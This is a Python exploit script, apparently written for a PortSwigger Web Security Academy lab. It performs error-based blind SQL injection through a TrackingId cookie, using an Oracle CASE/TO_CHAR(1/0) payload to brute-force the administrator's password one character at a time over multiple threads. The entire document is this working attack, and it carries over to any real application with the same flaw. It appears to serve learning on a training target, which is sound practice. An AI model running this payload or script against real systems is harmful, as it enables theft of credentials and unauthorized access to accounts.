import requests
from pwn import *
import concurrent.futures

data_retrieved = ""


def check_char(process, c, cth):
    global data_retrieved

    burp0_url = "https://0a27003d03080d6c81c91b9200cb00d7.web-security-academy.net:443/login"
    burp0_cookies = {"TrackingId": f"9VGEBjIgOPgqUfdt' ||(SELECT CASE WHEN (substr(password,{cth},1) = '{c}') THEN TO_CHAR(1/0) ELSE '' END from users where username = 'administrator')||'", "session": "3r7sotBPewPv1jxr08bMOhxu86a62x8i"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "none", "Sec-Fetch-User": "?1", "Te": "trailers"}
    r = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

    # if error appears
    if r.status_code == 500:
        print(f"Character retrieved: {c}")
        data_retrieved += c
        process.success(f'Valid character found ({c})!')
        

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$_'
chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
num_threads = 10

with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
    # password lenght = 20
    for i in range(20):
        process = log.progress(f"Testing {i+1}th char")

        # multithreading
        futures = []
        for c in range(len(chars)):
            futures.append(executor.submit(check_char, process, chars[c], i+1))
        # wait for all the requests to complete before checking results
        concurrent.futures.wait(futures)
        # clear the list of futures after each iteraction
        futures.clear()

        print(f"Data retrieved: {data_retrieved}")
